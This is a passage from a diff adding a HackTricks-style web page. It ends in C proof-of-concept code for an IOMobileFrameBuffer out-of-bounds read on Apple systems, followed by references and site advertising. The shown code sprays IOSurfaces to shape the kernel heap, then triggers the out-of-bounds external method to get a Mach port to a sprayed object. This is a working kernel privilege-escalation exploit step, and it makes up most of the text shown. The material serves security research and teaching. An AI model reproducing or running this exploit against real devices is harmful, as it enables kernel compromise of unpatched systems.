+    if (ret != KERN_SUCCESS) {
+        printf("[-] external method 83 failed: %s\n",  mach_error_string(ret));
+        return 0;
+    }
+
+    // This is the key: you get back a Mach port name (u32) to whatever
+    // object was at that OOB slot (ideally an IOSurface you sprayed).
+    printf("[*] external method 83 returned: 0x%llx\n", output_scalars[0]);
+    return output_scalars[0];
+}
+
+// Heap-shape with IOSurfaces so an OOB slot likely contains a pointer to a
+// real IOSurface (easier &amp; stabler than a fully fake object).
+bool do_spray(void) {
+    char data[0x10];
+    memset(data, 0x41, sizeof(data)); // Tiny payload for value spraying.
+
+    // Get IOSurfaceRootUserClient (reachable from sandbox/WebContent).
+    io_connect_t iosurface_uc = get_iosurface_root_uc();
+    if (iosurface_uc == MACH_PORT_NULL) {
+        printf("[-] do_spray: failed to allocate new iosurface_uc\n");
+        return false;
+    }
+
+    // Create many IOSurfaces and use set_value / value spray helpers
+    // (Brandon Azad-style) to fan out allocations in kalloc.  ⭐
+    int *surface_ids = (int*)malloc(SURFACES_COUNT * sizeof(int));
+    for (size_t i = 0; i &lt; SURFACES_COUNT; ++i) {
+        surface_ids[i] = create_surface(iosurface_uc);       // s_create_surface
+        if (surface_ids[i] &lt;= 0) {
+            return false;
+        }
+
+        // Spray small values repeatedly: tends to allocate/fill predictable
+        // kalloc regions near where the IOMFB table OOB will read from.
+        // The “with_gc” flavor forces periodic GC to keep memory moving/packed.
+        if (IOSurface_spray_with_gc(iosurface_uc, surface_ids[i],
+                                    20, 200,   // rounds, per-round items
+                                    data, sizeof(data),
+                                    NULL) == false) {
+            printf("iosurface spray failed\n");
+            return false;
+        }
+    }
+    return true;
+}
+
+int main(void) {
+    // Ensure we can talk to IOSurfaceRoot (some helpers depend on it).
+    io_connect_t iosurface_uc = get_iosurface_root_uc();
+    if (iosurface_uc == MACH_PORT_NULL) {
+        return 0;
+    }
+
+    printf("[*] do spray\n");
+    if (do_spray() == false) {
+        printf("[-] shape failed, abort\n");
+        return 1;
+    }
+    printf("[*] spray success\n");
+
+    // Trigger the OOB read. The magic constant chooses a pointer-slot
+    // far beyond the legit array (offset is in bytes; index = offset/8).
+    // If the spray worked, this returns a **Mach port name** (handle) to one
+    // of your sprayed IOSurfaces; otherwise it may crash.
+    printf("[*] trigger\n");
+    trigger_oob(0x1200000 + 0x1048);
+    return 0;
+}
+</code></pre>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
+<ul>
+<li>[1] <a href="https://saaramar.github.io/IOMobileFrameBuffer_LPE_POC/">Original writeup by Saar Amar - IOMobileFrameBuffer LPE PoC</a></li>
+<li>[2] <a href="https://github.com/saaramar/IOMobileFrameBuffer_LPE_POC">Exploit PoC code</a></li>
+<li>[3] <a href="https://support.apple.com/en-us/103144">About the security content of macOS Big Sur 11.5.1 (Apple security advisory)</a></li>
+<li>[4] <a href="https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html">Research from jsherman212</a></li>
+<li>[5] <a href="https://github.com/saaramar/IOMobileFrameBuffer_LPE_POC/blob/main/poc/exploit.c">saaramar/IOMobileFrameBuffer_LPE_POC - PoC was taken from here</a></li>
+</ul>
+<blockquote class="blockquote-tag blockquote-tag-tip">
+<p class="blockquote-tag-title">Tip</p>
+<p>Learn &amp; practice AWS Hacking:<img alt="" src="../../../../../images/arte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><a href="https://hacktricks-training.com/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img alt="" src="../../../../../images/arte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><br/>Learn &amp; practice GCP Hacking: <img alt="" src="../../../../../images/grte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><a href="https://hacktricks-training.com/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong></a><img alt="" src="../../../../../images/grte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><br/>Learn &amp; practice Az Hacking: <img alt="" src="../../../../../images/azrte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><a href="https://hacktricks-training.com/courses/azrte"><strong>HackTricks Training Azure Red Team Expert (AzRTE)</strong></a><img alt="" src="../../../../../images/azrte-badge-v1.webp" style="width:auto;height:24px;vertical-align:middle;"/><br/>Browse the <a href="https://hacktricks-training.com/courses/"><strong>full HackTricks Training catalog</strong></a>.</p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a>, the <a href="https://t.me/peass"><strong>telegram group</strong></a>, <strong>follow</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a> on <strong>X/Twitter</strong>, or check the <a href="https://www.linkedin.com/company/hacktricks/"><strong>LinkedIn page</strong></a> and <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>YouTube channel</strong></a>.</li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+</blockquote>
+<div class="bottomsponsor-wrapper">
+<a class="bottomsponsor ht-sponsor-card ht-sponsor-card--horizontal" href="" rel="noopener noreferrer" target="_blank">
+<span aria-hidden="true" class="ht-sponsor-grid"></span>
+<span aria-hidden="true" class="ht-sponsor-scan"></span>
+<span aria-hidden="true" class="ht-sponsor-corners"></span>
+<span class="ht-sponsor-kicker">Sponsored</span>
+<span class="ht-sponsor-media">
+<img alt="" src="" srcset=""/>
+</span>
+<span class="ht-sponsor-copy">
+<span class="bottomsponsor-title ht-sponsor-title"></span>
+<span class="bottomsponsor-description ht-sponsor-description"></span>
+</span>
+<span class="bottomsponsor-cta ht-sponsor-cta"></span>
+</a>
+<div aria-hidden="true" class="bottomsponsor-bsa">
+<div id="bsa-zone_1773736987437-6_123456"></div>
+</div>
+</div>
+<div aria-hidden="true" class="bsa-crawler-slot">
+<div id="bsa-zone_1773065859037-5_123456"></div>
+</div>
+<div aria-hidden="true" class="bsa-pageviews-slot">
+<div id="bsa-zone_1770368463-7_123456"></div>
+</div>
+<div aria-hidden="true" class="bsa-fixedfooter-slot">
+<div id="bsa-zone_1770367111944-8_123456"></div>
+</div>
+</main>
+
+</div>
+<div class="sidetoc">
+<button aria-label="Toggle page table of contents" aria-pressed="false" class="sidetoc-toggle" id="sidetoc-toggle" title="Toggle page table of contents" type="button">
+<span aria-hidden="true" class="toggle-chevron">&gt;&gt;</span>
+</button>
+<div class="sidetoc-wrapper" id="sidetoc-wrapper">
+
+<a class="sidesponsor ht-sponsor-card ht-sponsor-card--vertical" href="" rel="noopener noreferrer" target="_blank">
+<span aria-hidden="true" class="ht-sponsor-grid"></span>
+<span aria-hidden="true" class="ht-sponsor-scan"></span>
+<span aria-hidden="true" class="ht-sponsor-corners"></span>
+<span class="ht-sponsor-kicker">Sponsored</span>
+<span class="ht-sponsor-media">
+<img alt="" src="" srcset=""/>
+</span>
+<span class="ht-sponsor-copy">
+<span class="sponsor-title ht-sponsor-title"></span>
+<span class="sponsor-description ht-sponsor-description"></span>
+</span>
+<span class="sponsor-cta ht-sponsor-cta"></span>
+</a>
+<div aria-hidden="true" class="sidesponsor-bsa">
+<div id="bsa-zone_1773737041447-5_123456"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="footer">
+
+</div>
+</div>
+</div>
+<!-- Google Analytics Tag (GA4) -->
+
+<!--<script src="../../searcher.js"></script>-->
+
+<!-- Custom JS scripts -->
+
+</div>
+</body>
+</html>
